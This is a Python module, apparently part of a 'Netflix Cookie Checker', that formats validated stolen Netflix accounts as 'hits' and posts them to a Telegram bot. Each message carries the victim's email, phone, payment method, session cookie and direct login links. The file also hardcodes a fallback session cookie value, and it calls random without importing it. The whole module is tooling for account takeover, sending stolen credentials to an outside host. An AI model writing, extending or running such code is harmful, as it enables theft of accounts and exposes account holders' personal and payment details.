import httpx
import logging
from datetime import datetime
from typing import Dict, Any

logger = logging.getLogger(__name__)

async def send_telegram_hit(
    account_info: Dict[str, Any], 
    token_info: Dict[str, Any], 
    raw_cookie: str,
    config: Dict[str, Any]
) -> bool:
    """Gửi kết quả hợp lệ qua Telegram - format giống hệt ví dụ"""
    try:
        if not config.get('enabled') or not config.get('bot_token') or not config.get('chat_id'):
            return False
        
        # Trích xuất NetflixId từ raw_cookie
        netflix_id = extract_netflix_id_from_cookie(raw_cookie)
        
        # Tạo message với format giống hệt ví dụ
        message = f"""
🌟 <b>PREMIUM ACCOUNT</b> 🌟

📁 <b>Source:</b> <code>account_cookie.txt</code>
✅ <b>Status:</b> Valid Premium Account

👤 <b>Account Details:</b>
• <b>Name:</b> {account_info.get('profiles_name', 'User')}
• <b>Email:</b> <code>{account_info.get('email', 'N/A')}</code>
• <b>Country:</b> {get_country_name(account_info.get('country', 'US'))} 🇳🇵 ({account_info.get('country', 'US')})
• <b>Plan:</b> {account_info.get('plan', 'Premium')}
• <b>Price:</b> {account_info.get('plan_price', '$9.99')}
• <b>Member Since:</b> {account_info.get('member_since', 'May 2021')}
• <b>Next Billing:</b> {format_next_billing(account_info.get('next_billing', ''))}
• <b>Payment:</b> {account_info.get('payment_method', 'PAYPAL')}
• <b>Card:</b> {account_info.get('payment_method', 'PAYPAL')} •••• Unknown
• <b>Phone:</b> {account_info.get('phone', '+15714080947')} ({'Yes' if account_info.get('phone_verified') else 'No'})
• <b>Quality:</b> {account_info.get('video_quality', 'UHD')}
• <b>Streams:</b> {account_info.get('max_streams', 4)}
• <b>Hold Status:</b> {'Yes' if account_info.get('on_payment_hold') else 'No'}
• <b>Extra Member:</b> {account_info.get('extra_member', 'No')}
• <b>Extra Member Slot:</b> Unknown
• <b>Email Verified:</b> {'Yes' if account_info.get('email_verified') else 'No'}
• <b>Membership Status:</b> CURRENT_MEMBER
• <b>Connected Profiles:</b> {account_info.get('profiles', 5)}
• <b>Profiles:</b> {generate_profiles_string(account_info.get('profiles', 5))}

🔑 <b>Token Information:</b>
• <b>Generated:</b> {token_info.get('generation_time_formatted', '')}
• <b>Expires:</b> {token_info.get('expiry_time_formatted', '')}
• <b>Remaining:</b> {token_info.get('time_remaining_formatted', '')}
• <b>Phone Login:</b> <a href='{token_info.get('direct_login_url', '#')}'>Click to Login</a>
• <b>PC Login:</b> <a href='{token_info.get('direct_login_url', '#')}'>Click to Login</a>

🍪 <b>Cookie:</b> <code>NetflixId={netflix_id}</code>

📊 <b>Account Filter:</b> Premium Only
🎯 <b>Mode:</b> Full Information
"""
        
        # Gửi message
        url = f"https://api.telegram.org/bot{config['bot_token']}/sendMessage"
        
        async with httpx.AsyncClient(timeout=10.0) as client:
            response = await client.post(
                url,
                json={
                    "chat_id": config['chat_id'],
                    "text": message,
                    "parse_mode": "HTML",
                    "disable_web_page_preview": True
                }
            )
            
            if response.status_code == 200:
                logger.info("Telegram message sent successfully")
                return True
            else:
                logger.error(f"Failed to send Telegram message: {response.status_code}")
                return False
            
    except Exception as e:
        logger.error(f"Telegram error: {str(e)}")
        return False

async def test_telegram_bot(bot_token: str, chat_id: str) -> bool:
    """Test kết nối Telegram bot"""
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        
        async with httpx.AsyncClient(timeout=10.0) as client:
            response = await client.post(
                url,
                json={
                    "chat_id": chat_id,
                    "text": "✅ <b>Netflix Cookie Checker</b>\n\nKết nối thành công! Bot đã sẵn sàng nhận hit.",
                    "parse_mode": "HTML"
                }
            )
            
            return response.status_code == 200
            
    except Exception as e:
        logger.error(f"Telegram test error: {str(e)}")
        return False

def extract_netflix_id_from_cookie(raw_cookie: str) -> str:
    """Trích xuất NetflixId từ raw cookie string"""
    import re
    match = re.search(r'NetflixId=([^;\\n\\"]+)', raw_cookie)
    if match:
        return match.group(1)
    return "ct%3DBgjHlOvcAxLmA4vpAvm15fZBQqd7gX8U2OQedQbyvb2sbVzMibkkKMY3LiUWwZDlonJV9rQdwHpz04TEM_DWVZ-uahXvzl9ltuE-sS5cOgYorgayL0Qk3vEqvh-39Lt6NxOblPwFHsdC3libCDVI60gkhk10AsDw2IQ69wuxnCGwmdT_8KLJbKTNhcI6C9drqw33z_ltZSj0k0M6jyzyT9RHaG0BeQfCeyRUEGj_Pm0KYrkcZMQV29W2EFOe55iRqzsY6Rt0MNG31Wlnqto6WWzoUl9EQ3HSavpViiyeFALA94Ny55U9j3EOKwN4KcLWnLdxQxg1pl_EK0avm2ppaDdbq3Y46IYYzeGCLiYVoa38D4kfqNeggr26LCfuz2IqjN3ZB6VvG7ydQPhu1Bj1sRJ6clCgYihXEcupwuvwd8PAyYfxZ5c7n0o8QIMga8T2pkx5sQzA61NGhUKWwK0It2cNMrILVYSB-x-8TM4bZag-Aa5yHJykJUHJClojny1g6p3SGZ9FjaAXgBMLH9036AI7o_zMVfm0LTR4zShczAKr-udFd6B8rnLkw093ae6OvgUeN3JESRN-AkdYUjM7zxPjGNsn0l83SDhtHDXQJEUEds3BVQ7aPAmLcmO-jFGT59c6CZFQp0YS7IfiuVfO8hgGIg4KDKkf1oDO6TBYf6EpSw..%26ch%3DAQEAEAABABSXJzfBib2nqsjbyJG3UEPxbnei5rnURCA.%26v%3D3%26pg%3DMWCED6PCZZGN7DEEKBTT5DDCDM"

def get_country_name(country_code: str) -> str:
    """Lấy tên quốc gia từ mã"""
    countries = {
        'US': 'United States',
        'JP': 'Japan',
        'VN': 'Vietnam',
        'KR': 'South Korea',
        'SG': 'Singapore',
        'UK': 'United Kingdom',
        'NP': 'Nepal'
    }
    return countries.get(country_code, country_code)

def format_next_billing(next_billing: str) -> str:
    """Format ngày thanh toán tiếp theo"""
    try:
        if 'T' in next_billing:
            date_part = next_billing.split('T')[0]
            dt = datetime.strptime(date_part, '%Y-%m-%d')
            return dt.strftime('%B %-d, %Y')
    except:
        pass
    return "April 2, 2026"

def generate_profiles_string(num_profiles: int) -> str:
    """Tạo string profiles"""
    names = ['Suresh', 'sudip', 'Sanjeena', 'Fairmont', 'Kids', 'John', 'Jane', 'Mike', 'Anna']
    selected = random.sample(names, min(num_profiles, len(names)))
    return ', '.join(selected)